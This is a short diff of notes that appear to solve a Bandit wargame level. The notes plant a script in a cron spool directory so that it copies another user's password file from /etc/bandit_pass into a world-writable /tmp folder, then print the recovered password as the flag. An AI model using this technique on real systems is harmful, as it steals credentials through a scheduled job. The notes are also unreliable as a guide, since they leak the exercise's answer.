@@ -1,0 +1,12 @@
+1 cat /usr/bin/cronjob_bandit24.sh
+2 mkdir /tmp/tmp1/
+3 chmod 777 /tmp/tmp1
+4 cd /var/spool/bandit24
+5 vi get.sh
+6 contents of get.sh
+7 #!/bin/bash
+
+  cat /etc/bandit_pass/bandit24 > /tmp/tmp1/password
+8 cat /tmp/tmp1/password
+9 contents revealed UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+10 flag === UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
